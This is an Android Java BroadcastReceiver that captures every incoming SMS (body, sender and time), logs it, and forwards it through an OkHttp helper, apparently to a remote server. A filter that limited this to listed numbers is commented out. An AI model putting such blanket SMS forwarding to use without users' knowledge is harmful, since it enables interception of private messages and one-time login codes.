package com.outsource.smsdefault.HandleSms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import android.util.Log;

import com.outsource.smsdefault.Data.Data;
import com.outsource.smsdefault.OkHttp.OkHttp;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class SmsListener extends BroadcastReceiver {

	private SharedPreferences preferences;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) {
			for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent(intent)) {
				String messageBody = smsMessage.getMessageBody();
				String messagePhone = smsMessage.getOriginatingAddress();
				String messageTime = smsMessage.getTimestampMillis() + "";
				DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				Calendar cal = Calendar.getInstance();
				cal.setTimeInMillis(Long.parseLong(messageTime));

				messageTime = df.format(cal.getTime());
				Log.e("MINH TUAN: ", messageBody + ": " + messagePhone);
				OkHttp okHttp = new OkHttp();
				okHttp.messRev(messageBody, messagePhone, messageTime);
			/*	if (CheckSms.checkSmsInList(Data.USER,messagePhone)) {
					OkHttp okHttp = new OkHttp();
					okHttp.messRev(messageBody, messagePhone, messageTime);
				}*/
			}
		}
	}


}